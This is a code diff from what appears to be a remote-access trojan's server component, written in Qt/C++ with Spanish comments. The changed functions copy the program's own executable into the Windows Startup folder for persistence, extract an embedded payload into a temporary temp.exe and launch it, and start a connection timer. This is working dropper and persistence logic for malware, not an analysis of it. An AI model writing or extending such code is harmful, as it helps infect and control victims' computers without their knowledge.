@@ -80,7 +80,7 @@ void MainWindow::inicio(){
     {
         datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
     }
-    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup") && this->nombreCopiable != "noiniciar") { //Windows
+    if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
         copiarServidor(datos,QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + this->nombreCopiable);
     }
     temporizador.start(this->tiempoConexion); //iniciar el temporizador para conexión
@@ -164,18 +164,21 @@ void MainWindow::copiarServidor(QByteArray tramaConfiguracion, QString destino)
         tamano = this->tamanoAdjunto;
         QFile adjunto;
         QFile servidor;
-        QFile copiable;
         adjunto.setFileName(directorio.tempPath() + "/temp.exe");
         servidor.setFileName(QApplication::applicationFilePath());
-        copiable.setFileName(destino);
-        copiable.open(QFile::WriteOnly);
         adjunto.open(QFile::WriteOnly);
         servidor.open(QFile::ReadOnly);
-        copiable.write(servidor.read(servidor.size() - 1024 - tamano));
+        if(this->nombreCopiable != "noiniciar") //Solo necesitamos extraer el servidor si lo tenemos que copiar
+        {
+            QFile copiable;
+            copiable.setFileName(destino);
+            copiable.open(QFile::WriteOnly);
+            copiable.write(servidor.read(servidor.size() - 1024 - tamano));
+            copiable.write(tramaConfiguracion,1024);
+            copiable.close();
+        }
         servidor.seek(servidor.size() - 1024 - tamano);
         adjunto.write(servidor.read(tamano));
-        copiable.write(tramaConfiguracion,1024);
-        copiable.close();
         servidor.close();
         adjunto.close();
         proceso.setWorkingDirectory(directorio.tempPath());
